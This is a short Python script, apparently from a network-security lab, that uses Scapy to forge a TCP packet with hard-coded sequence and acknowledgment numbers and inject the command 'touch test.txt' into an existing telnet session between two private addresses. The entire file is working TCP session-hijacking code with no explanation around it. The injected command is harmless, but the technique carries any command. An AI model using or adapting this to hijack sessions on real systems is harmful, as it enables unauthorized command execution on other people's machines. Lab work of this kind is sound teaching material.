#!/usr/bin/env python3
from scapy.all import *
ip = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=56730, dport=23, flags="A", seq=1994990950, ack=3779579300)
data = "\n touch test.txt\n "
pkt = ip/tcp/data
ls(pkt)
send(pkt,verbose=0)
